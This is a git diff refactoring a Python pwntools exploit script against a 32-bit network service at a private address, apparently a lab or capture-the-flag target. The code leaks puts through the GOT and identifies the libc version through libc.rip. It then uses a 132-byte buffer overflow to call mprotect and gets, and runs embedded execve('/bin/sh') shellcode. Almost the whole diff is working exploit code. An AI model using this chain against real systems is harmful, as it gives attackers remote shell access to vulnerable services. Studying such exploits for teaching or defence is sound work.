@@ -2,27 +2,16 @@ import requests
 import json
 from pwn import remote, u32, p32, log
 
-remoteIp = '192.168.0.156'
-remotePort = 9000
-conn = remoteIp
-port = remotePort
-arch = 4
+# Static Configuration
+CONN, PORT = '192.168.0.156', 9000
+OUTPUT_LINES_BEFORE, OUTPUT_LINES_AFTER = 6, 2
 BUFF_SIZE = 132
-
-PLT_PUTS = 0x8048340
-pltGets = 0x08048330
-MAIN_ADDR = 0x804847b
-gotPuts = 0x80497ac
-gotGets = 0x80497a8
-
-OUTPUT_LINES_BEFORE = 6
-OUTPUT_LINES_AFTER = 2
-
-shellcode = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
-
-HEADERS = {'Content-Type': 'application/json'}
 FIND_LIBC_URL = 'https://libc.rip/api/find'
-libcSearchUrl = "https://libc.rip/api/libc/"
+LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
+HEADERS = {'Content-Type': 'application/json'}
+PLT_PUTS, PLT_GETS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x08048330, 0x804847b, 0x80497ac
+SHELLCODE = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
 
 def leak_via_puts(conn, port,puts_got_addr):
     """
@@ -46,7 +35,7 @@ def skip_lines(proc, lines):
 
 def attemptR2Libc_shellcode(putsOffset, mprotectOff):
     # Leak randomised libc puts addr
-    putsAddr = leak_via_puts(conn, port, gotPuts)
+    putsAddr = leak_via_puts(CONN, PORT, GOT_PUTS)
 
     # Get lib base addr using putsOffset
     libc_address = putsAddr - putsOffset
@@ -62,13 +51,13 @@ def attemptR2Libc_shellcode(putsOffset, mprotectOff):
 
     # Write shellcode payload to the address found above now changed to be writeable and executable using gets(&codeAddr)
     # Then execute that shellcode upon return of that gets()
-    payload = b'A' * BUFF_SIZE + p32(pltGets) + p32(codeAddr) + p32(codeAddr)
+    payload = b'A' * BUFF_SIZE + p32(PLT_GETS) + p32(codeAddr) + p32(codeAddr)
 
     proc.sendline(payload)
     log.success(f"Called gets({hex(codeAddr)}) with {hex(codeAddr)} as return addr")
 
     # Input shellcode to gets so it is written to 'codeAddr' and then executed on return
-    payload = b'\x90'*20 + shellcode
+    payload = b'\x90'*20 + SHELLCODE
 
     proc.sendline(payload)
     log.success(f"Sent shellcode to {hex(codeAddr)} via gets")
@@ -110,36 +99,23 @@ def find_potential_libcs(puts_addr):
     response = requests.post(FIND_LIBC_URL, headers=HEADERS, data=json.dumps(data))
     return response.json()
 
-def getLibcSymbolOffsets(libcJson):
-    # Get the libc id to perform a more thorough search of functions
-    libId = libcJson['id']
-    libcUrl = libcSearchUrl+libId
-    
-    # Define extra symbols to retrieve from the database
-    findSymbols = {"symbols": ["mprotect"]}
 
-    # Request symbols from the datatbase
-    response = requests.post(libcUrl, headers=HEADERS, data=json.dumps(findSymbols))
-    symbolJson = response.json()
-
-    # Store the symbols into variables
-    putsOff = symbolJson['symbols'].get('puts')
-    mprotectOff = symbolJson['symbols'].get('mprotect')
-    print()
-    log.info("Trying offsets for libc version: "+libId)
-    log.info(f"Offsets - puts: {putsOff}, mprotect: {mprotectOff}")
-    return putsOff, mprotectOff
-
+def get_libc_symbol_offsets(libc_id):
+    """
+    Retrieves offsets for essential libc symbols: 'puts', 'mprotect'.
+    """
+    libc_url = f"{LIBC_SEARCH_URL}{libc_id['id']}"
+    response = requests.post(libc_url, headers=HEADERS, json={"symbols": ["puts", "mprotect"]})
+    return response.json().get('symbols', {})
 
 def main():
-        putsAddr = leak_via_puts(conn,port,gotPuts)
-        responseJson = find_potential_libcs(putsAddr)
+    putsAddr = leak_via_puts(CONN, PORT, GOT_PUTS)
+    potential_libcs = find_potential_libcs(putsAddr)
 
-        for item in responseJson:
-        # Get the symbol offsets for the specific libc version
-            putsOff, mprotectOff = getLibcSymbolOffsets(item)
-            
-            attemptR2Libc_shellcode(int(putsOff,16),int(mprotectOff,16))
+    for libc in potential_libcs:
+        offsets = get_libc_symbol_offsets(libc)
+        puts_off, mprotect_off  = (int(offsets[sym], 16) for sym in ["puts", "mprotect"])   
+        attemptR2Libc_shellcode(puts_off, mprotect_off)
 
 
 if __name__ == "__main__":
